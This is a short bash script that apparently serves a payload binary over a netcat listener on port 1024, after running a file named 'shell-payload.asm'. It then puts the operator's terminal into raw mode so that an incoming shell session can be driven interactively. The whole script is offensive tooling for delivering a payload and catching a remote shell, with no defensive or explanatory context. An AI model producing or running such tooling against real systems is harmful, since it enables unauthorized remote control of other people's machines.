#!/bin/bash
set -euo pipefail
#set -x
PORT=1024
BIN=rr
[ -f "$BIN" ] || { echo "$BIN not found"; exit 12; }
[ -r "$BIN" ] || { echo "$BIN not readable"; exit 13; }

bash shell-payload.asm

echo "Listening on port $PORT, binary $BIN"
read -r rows cols < <(stty size)
echo "stty rows $rows cols $cols"

readonly STTY=$(stty -g)
trap "stty $STTY;echo;echo SAYONARA;echo" 0
stty raw -echo intr '^q'

nc -vlp $PORT < <(cat $BIN -)

exit 0
